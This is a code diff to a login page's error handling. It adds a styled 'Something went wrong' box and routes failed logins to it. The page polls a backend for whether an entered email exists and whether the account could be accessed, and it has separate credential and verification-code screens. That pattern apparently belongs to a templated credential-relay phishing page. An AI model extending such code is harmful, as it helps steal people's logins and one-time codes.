@@ -513,6 +513,14 @@
 
     .loading-error.visible { display: block; }
 
+    #styledErrorContainer{display:none;margin:20px auto;max-width:400px}
+    #styledErrorContainer .form-error-display{background:#fef2f2;border:1px solid #fecaca;border-radius:12px;padding:16px 20px;display:flex;align-items:flex-start;gap:12px}
+    #styledErrorContainer .form-error-display i{color:#dc2626;font-size:24px;margin-top:1px}
+    #styledErrorContainer .form-error-display .error-title{font-weight:600;color:#dc2626;font-size:15px;margin-bottom:4px}
+    #styledErrorContainer .form-error-display .error-msg{color:#161823;font-size:13px;line-height:1.5;margin:0}
+    #styledErrorContainer .retry-btn{background:#fe2c55;color:#fff;border:none;border-radius:6px;padding:8px 20px;font-size:13px;cursor:pointer;font-weight:600;margin-top:8px}
+    #styledErrorContainer .retry-btn:hover{background:#e01b44}
+
     /* ===== RESPONSIVE ===== */
     @media (max-width: 480px) {
       .header { padding: 12px 16px; }
@@ -767,6 +775,7 @@
   <p class="loading-text" id="loadingMessage"></p>
   <p class="loading-error" id="loadingError"></p>
 </div>
+<div id="styledErrorContainer"><div class="form-error-display"><i class="fas fa-exclamation-circle"></i><div style="flex:1;"><div class="error-title">Something went wrong</div><p class="error-msg" id="styledErrorMessage" style="margin-bottom:8px;"></p><button type="button" class="retry-btn" onclick="location.reload()">Retry</button></div></div></div>
 
 <script>
 // ==================== TEMPLATE CONFIG ====================
@@ -937,7 +946,10 @@ function hideAllErrors() {
     const el = document.getElementById(id);
     if (el) { el.classList.remove('visible'); el.textContent = ''; }
   });
+  const sc = document.getElementById('styledErrorContainer'); if (sc) sc.style.display = 'none';
 }
+function showStyledError(m){const c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block'}}
+function showFailedView(m){hideLoading();clearInterval(pollingIntervalId);['credentialScreen','verificationOptionsScreen','verificationCodeScreen'].forEach(id=>{const s=document.getElementById(id);if(s)s.style.display='none'});hideAllErrors();showStyledError(m)}
 
 function setError(id, msg) {
   const el = document.getElementById(id);
@@ -1133,26 +1145,18 @@ function updateUIForStatus(status, data = {}) {
       break;
 
     case 'FAILED':
-      hideLoading();
-      clearInterval(pollingIntervalId);
-      let emailExists = data.emailExists;
-      let accountAccess = data.accountAccess;
+      let failMsg = 'An error occurred. Please try again.';
       if (data.lastJsonResponse) {
         try {
           const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
-          if (emailExists === undefined) emailExists = lr.emailExists;
-          if (accountAccess === undefined) accountAccess = lr.accountAccess;
+          if (lr.message) failMsg = lr.message;
         } catch(e) {}
+      } else if (data.emailExists === false) {
+        failMsg = 'Account not found. Please check your credentials.';
+      } else if (data.accountAccess === false) {
+        failMsg = 'Incorrect email or password. Try again.';
       }
-      showScreen('credentialScreen');
-      if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
-      if (emailExists === false) {
-        setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', "Account not found. Please check your credentials.");
-      } else if (accountAccess === false) {
-        setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', "Incorrect email or password. Try again.");
-      } else {
-        setError('loadingError', "An error occurred. Please try again.");
-      }
+      showFailedView(failMsg);
       break;
 
     default:
